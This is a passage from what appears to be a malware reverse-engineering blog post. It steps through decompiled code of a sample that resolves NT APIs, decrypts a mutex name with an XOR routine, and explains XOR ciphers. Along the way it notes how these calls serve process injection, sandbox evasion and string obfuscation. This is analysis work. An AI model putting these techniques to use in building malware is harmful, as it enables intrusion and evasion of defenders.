</span></span><span style="display:flex;"><span>v40 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeviceIoControlFile;
</span></span></code></pre></div><p>sends a control code directly to a specified device driver, causing the corresponding device to perform a specified operation. can be used for low-level interaction with hardware. maybe to exploit specific vulns or interact with specific drivers.</p>
<h1 id="ntsetcontextthread_0"><code>NtSetContextThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v41 <span style="color:#ff79c6">=</span> NtSetContextThread_0;
</span></span><span style="display:flex;"><span>v43 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetContextThread;
</span></span></code></pre></div><p>sets the context of a thread. this could be registers, a stack pointer, etc. can be used to hijack a thread&rsquo;s execution or to modify behaviour for process injection.</p>
<h1 id="ntopenprocess_0"><code>NtOpenProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v44 <span style="color:#ff79c6">=</span> NtOpenProcess_0;
</span></span><span style="display:flex;"><span>v46 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenProcess;
</span></span></code></pre></div><p>opens a handle to an existing process. can be used to gain access to another process for process injection/monitoring.</p>
<h1 id="ntclose_0"><code>NtClose_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v47 <span style="color:#ff79c6">=</span> NtClose_0;
</span></span><span style="display:flex;"><span>v49 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtClose;
</span></span></code></pre></div><p>closes an open handle to a process, thread, or system object. used to close handles for clean up and evading detection.</p>
<h1 id="ntcreatefile_0"><code>NtCreateFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v50 <span style="color:#ff79c6">=</span> NtCreateFile_0;
</span></span><span style="display:flex;"><span>v52 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateFile;
</span></span></code></pre></div><p>creates/opens a file or I/O device. can be used to open files for reading/writing, probably to drop payloads or access config files.</p>
<h1 id="ntopenfile_0"><code>NtOpenFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v53 <span style="color:#ff79c6">=</span> NtOpenFile_0;
</span></span><span style="display:flex;"><span>v55 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenFile;
</span></span></code></pre></div><p>opens a handle to a file or I/O device. similar to <code>NtCreateFile</code>.</p>
<h1 id="ntdeletefile_0"><code>NtDeleteFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v56 <span style="color:#ff79c6">=</span> NtDeleteFile_0;
</span></span><span style="display:flex;"><span>v58 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeleteFile;
</span></span></code></pre></div><p>deletes a file from the file system. can be used to remove traces of malware presence from the system.</p>
<h1 id="ntreadvirtualmemory_0"><code>NtReadVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v59 <span style="color:#ff79c6">=</span> NtReadVirtualMemory_0;
</span></span><span style="display:flex;"><span>v61 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadVirtualMemory;
</span></span></code></pre></div><p>reads data from the virtual memory of a process. can be used to read the memory of other processes, probably to steal data or gather information.</p>
<h1 id="ntqueryvirtualmemory_0"><code>NtQueryVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v62 <span style="color:#ff79c6">=</span> NtQueryVirtualMemory_0;
</span></span><span style="display:flex;"><span>v64 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryVirtualMemory;
</span></span></code></pre></div><p>gets information about a region of virtual memory. can be used to inspect the memory layout of its own process or another, probably to map out where to inject or execute code.</p>
<h1 id="ntopenthread_0"><code>NtOpenThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v65 <span style="color:#ff79c6">=</span> NtOpenThread_0;
</span></span><span style="display:flex;"><span>v67 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenThread;
</span></span></code></pre></div><p>opens a handle to an existing thread. similar to <code>NtOpenProcess</code>.</p>
<h1 id="ntresumethread_0"><code>NtResumeThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v68 <span style="color:#ff79c6">=</span> NtResumeThread_0;
</span></span><span style="display:flex;"><span>v70 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtResumeThread;
</span></span></code></pre></div><p>resumes a suspended thread. can be used to suspend a thread to inject code or modify the context, then resume it to execute the injected code.</p>
<h1 id="ntfreevirtualmemory_0"><code>NtFreeVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v71 <span style="color:#ff79c6">=</span> NtFreeVirtualMemory_0;
</span></span><span style="display:flex;"><span>v73 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFreeVirtualMemory;
</span></span></code></pre></div><p>frees up a region of virtual memory in a process. can be used to free up the memory after exploitation to clean up and reduce the footprint.</p>
<h1 id="ntflushinstructioncache_0"><code>NtFlushInstructionCache_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v74 <span style="color:#ff79c6">=</span> NtFlushInstructionCache_0;
</span></span><span style="display:flex;"><span>v76 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFlushInstructionCache;
</span></span></code></pre></div><p>flushes the instruction cache for a process. this makes sure that changes to code are recognized by the CPU and executed correctly.</p>
<h1 id="rtlrandomex_0"><code>RtlRandomEx_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v77 <span style="color:#ff79c6">=</span> RtlRandomEx_0;
</span></span><span style="display:flex;"><span>v79 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlRandomEx;
</span></span></code></pre></div><p>generates a pseudorandom number. can be used to generate random values [obfuscation, encryption, non-deterministic behaviour].</p>
<h1 id="ntquerysysteminformation_0"><code>NtQuerySystemInformation_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v80 <span style="color:#ff79c6">=</span> NtQuerySystemInformation_0;
</span></span><span style="display:flex;"><span>v82 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQuerySystemInformation;
</span></span></code></pre></div><p>gets system information like process lists, performance metrics, etc.</p>
<h1 id="ldrqueryprocessmoduleinformation_0"><code>LdrQueryProcessModuleInformation_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v83 <span style="color:#ff79c6">=</span> LdrQueryProcessModuleInformation_0;
</span></span><span style="display:flex;"><span>v85 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrQueryProcessModuleInformation;
</span></span></code></pre></div><p>gets information about the modules [DLLs] loaded in a process.</p>
<h1 id="rtlinitunicodestring_0"><code>RtlInitUnicodeString_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v86 <span style="color:#ff79c6">=</span> RtlInitUnicodeString_0;
</span></span><span style="display:flex;"><span>v88 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlInitUnicodeString;
</span></span></code></pre></div><p>initializaes a <code>UNICODE_STRING</code> structure, often used in many WinAPI calls. can be used to prepare strings [DLL names, file paths, etc.].</p>
<h1 id="ntwritefile_0"><code>NtWriteFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v89 <span style="color:#ff79c6">=</span> NtWriteFile_0;
</span></span><span style="display:flex;"><span>v91 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteFile;
</span></span></code></pre></div><p>writes data to a file or I/O device. can be used to write logs, drop payloads, or modify files for persistence.</p>
<h1 id="ntreadfile_0"><code>NtReadFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v92 <span style="color:#ff79c6">=</span> NtReadFile_0;
</span></span><span style="display:flex;"><span>v94 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadFile;
</span></span></code></pre></div><p>reads data from file or I/O device.</p>
<h1 id="ntdelayexecution_0"><code>NtDelayExecution_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v95 <span style="color:#ff79c6">=</span> NtDelayExecution_0;
</span></span><span style="display:flex;"><span>v97 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDelayExecution;
</span></span></code></pre></div><p>suspends execution of the current thread for a specified interval (delay). can be used to avoid sandbox analysis, or to sync with other events.</p>
<h1 id="ntopenkey_0"><code>NtOpenKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v98 <span style="color:#ff79c6">=</span> NtOpenKey_0;
</span></span><span style="display:flex;"><span>v100 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenKey;
</span></span></code></pre></div><p>opens a handle to a registry key. can be used to write values to the registry.</p>
<h1 id="ntsetvaluekey_0"><code>NtSetValueKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v101 <span style="color:#ff79c6">=</span> NtSetValueKey_0;
</span></span><span style="display:flex;"><span>v103 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetValueKey;
</span></span></code></pre></div><p>sets the value of a registry key.</p>
<h1 id="ntqueryvaluekey_0"><code>NtQueryValueKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v104 <span style="color:#ff79c6">=</span> NtQueryValueKey_0;
</span></span><span style="display:flex;"><span>v106 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryValueKey;
</span></span></code></pre></div><p>queries the value of a registry key.</p>
<h1 id="rtlformatcurrentuserkeypath_0"><code>RtlFormatCurrentUserKeyPath_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v107 <span style="color:#ff79c6">=</span> RtlFormatCurrentUserKeyPath_0;
</span></span><span style="display:flex;"><span>v109 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlFormatCurrentUserKeyPath;
</span></span></code></pre></div><p>formats a string that represents the current user&rsquo;s key path in the registry. can be used to dynamically construct paths to user-specific registry settings.</p>
<h1 id="ntqueryinformationfile_0"><code>NtQueryInformationFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v110 <span style="color:#ff79c6">=</span> NtQueryInformationFile_0;
</span></span><span style="display:flex;"><span>v112 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationFile;
</span></span></code></pre></div><p>gets information about a file. can be used to verify files to make sure they&rsquo;re the right target.</p>
<h2 id="renaming-remaining-functions">renaming remaining functions</h2>
<p>the fourth function inside <code>sub_180006298()</code> [<code>sub_180009328()</code>] seems to be resolving the <code>kernel32</code> and <code>ntdll</code> APIs as well.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-3.png" alt="API resolutions"  />
</p>
</p>
<p>let&rsquo;s rename it to <code>mw_resolve_kernel32_api()</code>.</p>
<p>similarly, functions <code>sub_18000A2D8()</code> [resolves module handles], <code>sub_180008EF0()</code> [resolves more APIs and DLLs], and the return function <code>sub_18000AAAC()</code> [resolves the <code>ole32</code> API] can be resolved to <code>mw_resolve_module_handles</code>, <code>mw_resolve_misc_api</code>, and <code>mw_resolve_ole32</code> respectively!</p>
<p>let&rsquo;s also rename <code>sub_180006298()</code> to <code>mw_resolve_handle_apis()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_handle_apis</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_kernel32_dll() 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_ntdll_dll()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_ntapi()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_kernel32_api()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_module_handles()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_misc_api() )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> mw_resolve_ole32;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="api-pivoting">API pivoting</h2>
<p>the function <code>sub_180003868()</code> now has a lot more information than before.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-4.png" alt="more information"  />
</p>
</p>
<p>i&rsquo;m going to examine the statement at line 32:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>qword_180010480 <span style="color:#ff79c6">=</span> mw_addr_CreateMutexW(<span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>, v9);
</span></span></code></pre></div><p>according to the MSDN, <code>CreateMutexW</code> creates/opens a named or unnamed mutext object. a &ldquo;mutex object&rdquo; is a synchronization object whose state is set to signaled when it is not owned by any thread, and nonsignaled when it is owned. basically, &ldquo;mutex&rdquo; is a &ldquo;<strong>mu</strong>tually <strong>ex</strong>clusive&rdquo; flag. it acts as a &ldquo;gatekeeper&rdquo; to a section of code, allowing one thread in and blocking access to all others.</p>
<p>so, using the <code>CreateMutexEx</code> function specifies an access mask for the object in question. the syntax for this function should shed some light on how it&rsquo;s being used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>HANDLE CreateMutexW(
</span></span><span style="display:flex;"><span>    [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
</span></span><span style="display:flex;"><span>    [in]           BOOL                  bInitialOwner,
</span></span><span style="display:flex;"><span>    [in, optional] LPCWSTR               lpName
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>in the screenshot above, the multiple positions of <code>v9</code> are curious.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>sub_18000ACC8((<span style="color:#ff79c6">__int64</span>)<span style="color:#ff79c6">&amp;</span>unk_18000FA00, (<span style="color:#ff79c6">__int64</span>)v9);
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> v9;
</span></span><span style="display:flex;"><span>qword_180010480 <span style="color:#ff79c6">=</span> mw_addr_CreateMutexW(<span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>, v9);
</span></span></code></pre></div><p>it appears in three spots, not including its initialization in line 11 [<code>char v9[72];</code>]. so what&rsquo;s going on?</p>
<p><code>v9</code> is passed as an argument, along with <code>unk_18000FA00</code>, to the function <code>sub_18000ACC8()</code>. <code>v9</code> is then transformed by this function, and passed as the third argument to <code>CreateMutexW</code>, meaning its going to be the name of the created mutex object. if <code>v9</code> is some sort of string, and its being transformed to then be used as the name of a newly created mutex object, this means that <code>v9</code> is being decrypted by the function <code>sub_18000ACC8()</code> and the argument <code>unk_18000FA00</code> is some encrypted data.</p>
<p>the function definition is at the very top, and it goes like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> sub_18000ACC8(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span></code></pre></div><p>following the above logic, <code>a1</code> would be encrypted data and <code>a2</code> would be decrypted data. let&rsquo;s take a look at the code below the definition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>computer, enhance! let&rsquo;s take a closer look at two of the lines.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span></code></pre></div><p>these lines contain something called a &ldquo;bitwise XOR&rdquo; operator (denoted by <code>^</code>). XOR is a fundamental digital logic operation that outputs false [<code>0</code>] if both input bits are the same, and outputs true [<code>1</code>] otherwise. the truth table of a simple XOR gate is as follows:</p>
<table>
  <thead>
      <tr>
          <th>X</th>
          <th>Y</th>
          <th>X ^ Y</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>0</td>
          <td>0</td>
      </tr>
      <tr>
          <td>0</td>
          <td>1</td>
          <td>1</td>
      </tr>
      <tr>
          <td>1</td>
          <td>0</td>
          <td>1</td>
      </tr>
      <tr>
          <td>1</td>
          <td>1</td>
          <td>0</td>
      </tr>
  </tbody>
</table>
<h2 id="cryptography-refresher-xor-ciphers">cryptography refresher: XOR ciphers</h2>
<p>some of you may remember XOR ciphers from second-year CS/ECE courses in university. it&rsquo;s a basic, yet powerful, encryption algorithm that operates as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>A ^ 0 = A
</span></span><span style="display:flex;"><span>A ^ A = 0
</span></span><span style="display:flex;"><span>A ^ B = B ^ A
</span></span><span style="display:flex;"><span>(A ^ B) ^ C = A ^ (B ^ C)
</span></span><span style="display:flex;"><span>(B ^ A) ^ A = B ^ 0 = B
</span></span></code></pre></div><p>using this logic, a string of text can be encrypted by applying <code>^</code> to every character using a given <strong>key</strong>.</p>
<p>take a plaintext message, <code>M</code>, and a secret key, <code>K</code>. performing <code>M ^ K</code> yields an encrypted message, <code>E</code> [<code>M ^ K = E</code>]. to decrypt <code>E</code>, you just have to XOR it with the same key, <code>K</code> [<code>E ^ K = M</code>]. this is really convenient because the same operation can be used to both encrypt and decrypt.</p>
<p>there are some caveats, though. if a fixed-length key, <code>K</code>, is shorter than the message, <code>M</code>, the cipher can be broken by a &ldquo;frequency analysis&rdquo; (certain letters + combinations appearing more than once).</p>
<p>however, if the key <code>K</code> is as long as the message <code>M</code>, the only way to break the cipher is by trying every possible key. this brute-force attack quickly becomes unfeasibly expensive because a key of <code>n</code>-bits has <code>2^n</code> possibilities.</p>
<p>sharing a long key <code>K</code> securely is also a challenge. on top of that, repeatedly using a long key <code>K</code> for multiple messages will be subjected to a frequency-based attack.</p>
<p>a good way around this is to use a pseudo-random number generator [<code>RNG</code>] to generate an unpredictable and repeatable stream of keys. this way, only the initial seed (much shorter) for the generator needs to be shared, assuming both parties are using the same generator. each block of the message is then encrypted using subsequent keys from the generator.</p>
<p>from a security perspective, a simple repeating XOR (i.e. using the same key for XOR operation throughout the dataset) is enough to hide information in case where no extra security is required.</p>
<h3 id="xor-ciphers-in-malware">XOR ciphers in malware</h3>
<p>exploit developers use XOR ciphers to obfuscate their code and data, which makes reverse engineering more challenging.</p>
<p>portions of malware code can be XOR-encrypted, and then decrypted on the fly when the malware runs. static analysis here would be difficult because the original instructions appear as &ldquo;random&rdquo; data.</p>
<p>string obfuscation is another effective tactic used by exploit devs, turning plaintext strings like APIs, URLs, file paths, and C2 server addresses into encrypted ones, so using a string extraction tool here won&rsquo;t help.</p>
<h2 id="string-decryption">string decryption</h2>
<p>let&rsquo;s come back to the function above with this new perspective.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
